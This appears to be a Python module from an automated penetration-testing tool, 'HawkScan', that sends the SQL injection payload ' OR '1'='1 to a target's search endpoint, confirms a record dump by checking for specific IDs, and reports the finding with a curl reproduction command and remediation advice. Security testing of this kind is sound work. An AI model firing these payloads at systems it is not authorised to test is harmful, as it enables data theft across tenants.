"""HawkScan Exploitation Agent: SQL Injection (SQLi)
Tests for raw SQL concatenation, executes payloads, and verifies database breaches.
"""

import httpx
from urllib.parse import urljoin, quote
from typing import Dict, Any, Optional, Callable
from hawkscan.engine.step_recorder import StepRecorder


class SqliExploitAgent:
    """Exploitation agent targeting SQL Injection flaws (OWASP A03 / CWE-89)."""

    def __init__(self, target_url: str, emit_fn: Optional[Callable[[str, str], Any]] = None):
        self.target_url = target_url.rstrip("/")
        self.emit_fn = emit_fn

    def log(self, msg: str):
        if self.emit_fn:
            self.emit_fn("exploitation", msg)

    async def execute_exploit(self, session: Dict[str, Any], static_surface: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Tests SQL injection payload against the search endpoint."""
        self.log("SQLi Agent: Formulating SQL injection payloads against /api/search?q=...")

        # Payload designed to force TRUE condition in SQL WHERE clause
        sqli_payload = "' OR '1'='1"
        encoded_payload = quote(sqli_payload)
        exploit_url = urljoin(self.target_url, f"/api/search?q={encoded_payload}")

        repro_curl = f"curl -X GET '{urljoin(self.target_url, f'/api/search?q={sqli_payload}')}'"

        self.log(f"Firing SQL injection payload -> GET /api/search?q={sqli_payload}...")

        async with httpx.AsyncClient(timeout=5.0, verify=False) as client:
            try:
                resp = await client.get(exploit_url, headers={"User-Agent": "HawkScan-AI-Pentester/1.0"})
                
                # Check for successful SQL injection
                if resp.status_code == 200:
                    body = resp.json()
                    # If injection succeeded, multiple/all corporate records are returned
                    if isinstance(body, list) and len(body) >= 2:
                        rec_ids = [r.get("id") for r in body if isinstance(r, dict)]
                        if "REC-9001" in rec_ids and "REC-9002" in rec_ids:
                            self.log("SQL INJECTION EXPLOIT CONFIRMED: Bypassed query filters to dump all confidential corporate records!")
                            recorder = StepRecorder(agent_name="SqliExploitAgent")
                            recorder.record_step("NAVIGATE", self.target_url, "Opened target application search interface", "SUCCESS")
                            recorder.record_step("INJECT_SQL_PAYLOAD", exploit_url, f"Injected boolean breakout string '{sqli_payload}' into 'q' parameter", "SUCCESS")
                            recorder.record_step("DUMP_MULTI_TENANT_RECORDS", exploit_url, f"Bypassed tenant isolation filter; dumped {len(body)} database records: {', '.join(rec_ids)}", "BREACH_CONFIRMED")

                            return {
                                "vulnerability_id": "HAWKSCAN-SQLI-001",
                                "title": "SQL Injection in Query Search Parameter (SQLi)",
                                "severity": "HIGH",
                                "cwe_id": "CWE-89",
                                "owasp_category": "A03:2021-Injection",
                                "target_endpoint": "/api/search",
                                "http_method": "GET",
                                "status": "VERIFIED_EXPLOIT",
                                "recorded_steps": recorder.get_steps(),
                                "description": (
                                    "The 'q' query parameter in /api/search is concatenated directly into a raw SQL query. "
                                    "Submitting an SQL breakout payload (' OR '1'='1) forces an unconditionally true condition, "
                                    "dumping all records across tenant boundaries."
                                ),
                                "proof_of_concept": {
                                    "exploit_command": repro_curl,
                                    "http_status": resp.status_code,
                                    "leaked_payload": body,
                                    "evidence_summary": f"Exfiltrated {len(body)} database records: {', '.join(rec_ids)}."
                                },
                                "remediation": {
                                    "target_file": "target_app/routes/search.py",
                                    "guidance": "Use parameterized queries or ORM filter bindings instead of raw string interpolation."
                                }
                            }
                elif resp.status_code == 500 and "syntax" in resp.text.lower():
                    self.log("SQL syntax error disclosed in server response.")
            except Exception as e:
                self.log(f"SQLi exploit attempt encountered error: {e}")

        return None
